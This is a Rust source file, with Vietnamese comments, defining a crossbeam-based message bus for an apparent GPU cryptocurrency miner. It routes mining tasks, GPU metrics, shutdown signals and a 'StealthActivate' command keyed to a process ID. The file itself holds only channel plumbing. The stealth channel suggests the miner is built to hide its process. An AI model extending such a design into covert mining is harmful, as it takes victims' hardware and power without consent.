/*!
 * Message Bus Implementation
 *
 * Lock-free MPMC channels cho inter-module communication.
 */

use crossbeam::channel::{bounded, unbounded, Sender, Receiver};
use std::sync::Arc;

/// Message types routed qua bus
#[derive(Debug, Clone)]
pub enum Message {
    /// GPU mining task với shared data
    GpuTask(Arc<MiningTask>),

    /// Metrics update từ GPU module
    MetricsUpdate(GpuMetrics),

    /// Stealth activation command
    StealthActivate(u32), // PID

    /// System shutdown signal
    Shutdown,
}

/// Mining task data
#[derive(Debug, Clone)]
pub struct MiningTask {
    pub job_id: u64,
    pub difficulty: u64,
    pub input_data: Vec<u8>,
    pub timeout_ms: u64,
}

/// GPU metrics snapshot
#[derive(Debug, Clone, Copy)]
pub struct GpuMetrics {
    pub gpu_id: usize,
    pub hashrate: f64,
    pub temperature: f32,
    pub power_usage: f32,
    pub timestamp: u64,
}

/// Main message bus structure
#[derive(Clone)]
pub struct MessageBus {
    api_tx: Sender<Message>,
    gpu_txs: Vec<Sender<Message>>,
    stealth_tx: Sender<Message>,
    metrics_tx: Sender<Message>,
    broadcast_tx: Sender<Message>,
}

impl MessageBus {
    /// Create new message bus
    ///
    /// # Arguments
    /// * `num_gpus` - Number of GPU workers
    /// * `channel_capacity` - Buffer size cho bounded channels
    pub fn new(num_gpus: usize, channel_capacity: usize) -> (Self, MessageBusHandles) {
        // API channel - unbounded (user requests cannot be dropped)
        let (api_tx, api_rx) = unbounded();

        // GPU channels - bounded (prevent memory exhaustion)
        let mut gpu_txs = Vec::with_capacity(num_gpus);
        let mut gpu_rxs = Vec::with_capacity(num_gpus);
        for _ in 0..num_gpus {
            let (tx, rx) = bounded(channel_capacity);
            gpu_txs.push(tx);
            gpu_rxs.push(rx);
        }

        // Stealth channel - bounded, lower priority
        let (stealth_tx, stealth_rx) = bounded(channel_capacity / 10);

        // Metrics channel - unbounded (small data, critical)
        let (metrics_tx, metrics_rx) = unbounded();

        // Broadcast channel - unbounded (shutdown signals)
        let (broadcast_tx, broadcast_rx) = unbounded();

        let bus = MessageBus {
            api_tx: api_tx.clone(),
            gpu_txs: gpu_txs.clone(),
            stealth_tx: stealth_tx.clone(),
            metrics_tx: metrics_tx.clone(),
            broadcast_tx: broadcast_tx.clone(),
        };

        let handles = MessageBusHandles {
            api_rx,
            gpu_rxs,
            stealth_rx,
            metrics_rx,
            broadcast_rx,
            api_tx,
            gpu_txs,
            stealth_tx,
            metrics_tx,
            broadcast_tx,
        };

        (bus, handles)
    }

    /// Send message đến specific GPU
    pub fn send_to_gpu(&self, gpu_id: usize, msg: Message) -> Result<(), SendError> {
        self.gpu_txs
            .get(gpu_id)
            .ok_or(SendError::InvalidGpuId(gpu_id))?
            .send(msg)
            .map_err(|_| SendError::ChannelDisconnected)?;
        Ok(())
    }

    /// Broadcast message đến tất cả modules
    pub fn broadcast(&self, msg: Message) -> Result<(), SendError> {
        self.broadcast_tx
            .send(msg)
            .map_err(|_| SendError::ChannelDisconnected)?;
        Ok(())
    }

    /// Send metrics (never blocks)
    pub fn send_metrics(&self, metrics: GpuMetrics) -> Result<(), SendError> {
        self.metrics_tx
            .send(Message::MetricsUpdate(metrics))
            .map_err(|_| SendError::ChannelDisconnected)?;
        Ok(())
    }
}

/// Receiver handles owned by modules
#[derive(Clone)]
pub struct MessageBusHandles {
    pub api_rx: Receiver<Message>,
    pub gpu_rxs: Vec<Receiver<Message>>,
    pub stealth_rx: Receiver<Message>,
    pub metrics_rx: Receiver<Message>,
    pub broadcast_rx: Receiver<Message>,

    // Senders for inter-module communication
    pub api_tx: Sender<Message>,
    pub gpu_txs: Vec<Sender<Message>>,
    pub stealth_tx: Sender<Message>,
    pub metrics_tx: Sender<Message>,
    pub broadcast_tx: Sender<Message>,
}

/// Send errors
#[derive(Debug, thiserror::Error)]
pub enum SendError {
    #[error("Invalid GPU ID: {0}")]
    InvalidGpuId(usize),

    #[error("Channel disconnected")]
    ChannelDisconnected,
}
